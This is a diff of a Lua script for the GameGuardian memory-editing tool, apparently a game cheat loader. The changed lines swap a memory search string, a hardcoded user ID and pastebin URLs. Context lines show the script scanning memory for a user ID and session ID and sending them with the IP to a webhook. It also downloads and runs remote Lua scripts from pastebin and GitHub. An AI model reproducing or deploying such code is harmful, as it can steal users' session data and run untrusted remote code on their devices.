@@ -54,7 +54,7 @@ end
 --------------------------------------------------
 local function findUserId()
   gg.setRanges(gg.REGION_C_ALLOC )
-  gg.searchNumber(':userId', gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
+  gg.searchNumber(':Comet', gg.TYPE_BYTE, false, gg.SIGN_EQUAL, 0, -1)
   gg.getResults(10000)
   gg.clearResults()
   gg.setRanges(gg.REGION_ANONYMOUS | gg.REGION_C_ALLOC)
@@ -118,7 +118,7 @@ sendToWebhook(userId, sessionId, ip, nil)
 --------------------------------------------------
 -- fetch login data
 --------------------------------------------------
-local data = gg.makeRequest("https://pastebin.com/raw/rfpVeaqU").content
+local data = gg.makeRequest("https://pastebin.com/raw/9Na7g8p4").content
 if not data or data == '' then
   gg.alert("📡 Cannot load login data. check internet connection.")
   return
@@ -320,7 +320,7 @@ while true do
 
   -- handle "start script" option
   local key, sessionId
-  local specificUserId = "33512ssghbd7851"
+  local specificUserId = "33512ggd497851"
   
   -- Check if userId matches the specific ID
   local actualUserId, actualSessionId = findUserId()
@@ -418,7 +418,7 @@ while true do
   if entry.version == "v1" then
     scriptUrl = "https://raw.githubusercontent.com/Jkram143/sxvbjjxz/refs/heads/main/DC.lua"
   elseif entry.version == "Admin" then
-    scriptUrl = "https://pastebin.com/raw/rfpVeaqU"
+    scriptUrl = "https://pastebin.com/raw/f7niSW2r"
   else
     gg.alert(t.invalid_version)
     goto continue
